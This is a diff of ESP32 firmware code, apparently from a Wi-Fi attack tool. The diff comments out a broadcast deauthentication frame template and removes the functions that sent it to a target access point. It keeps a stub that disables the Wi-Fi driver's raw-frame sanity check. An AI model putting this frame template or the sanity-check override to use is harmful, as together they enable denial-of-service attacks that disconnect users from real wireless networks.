@@ -1,7 +1,5 @@
 #include "wsl_bypasser.h"
 
-const char* TAG = "WSL_Bypasser";
-
 /**
  * @brief Deauthentication frame template
  * 
@@ -10,15 +8,15 @@ const char* TAG = "WSL_Bypasser";
  * 
  * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
  */
-static const uint8_t deauth_frame_default[] = {
-    0xc0, 0x00,
-    0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xf0, 0xff,
-    0x02, 0x00
-};
+// static const uint8_t deauth_frame_default[] = {
+//     0xc0, 0x00,
+//     0x3a, 0x01,
+//     0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+//     0xf0, 0xff,
+//     0x02, 0x00
+// };
 
 /**
  * @brief Decomplied function that overrides original one at compilation time.
@@ -28,18 +26,4 @@ static const uint8_t deauth_frame_default[] = {
  */
 int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
     return 0;
-}
-
-void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
-}
-
-void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
-    ESP_LOGD(TAG, "Sending deauth frame...");
-    uint8_t deauth_frame[sizeof(deauth_frame_default)];
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    memcpy(&deauth_frame[10], ap_record->bssid, 6);
-    memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    
-    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
